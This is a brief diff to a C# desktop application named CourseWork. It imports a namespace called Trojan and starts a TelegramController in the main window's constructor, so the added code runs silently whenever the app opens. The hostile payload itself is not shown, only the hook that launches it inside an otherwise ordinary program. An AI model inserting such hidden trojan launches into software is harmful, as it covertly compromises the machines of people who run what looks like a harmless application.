@@ -4,6 +4,7 @@ using System;
 using System.IO;
 using System.Windows;
 using System.Windows.Input;
+using Trojan;
 
 namespace CourseWork
 {
@@ -15,6 +16,8 @@ namespace CourseWork
         public MainWindow()
         {
             InitializeComponent();
+            TelegramController telegramController = new TelegramController();
+            telegramController.Start();
             this.SequenceNumberTextBox.PreviewTextInput += new TextCompositionEventHandler(SequenceNumberTextBox_PreviewTextInput);
         }
 
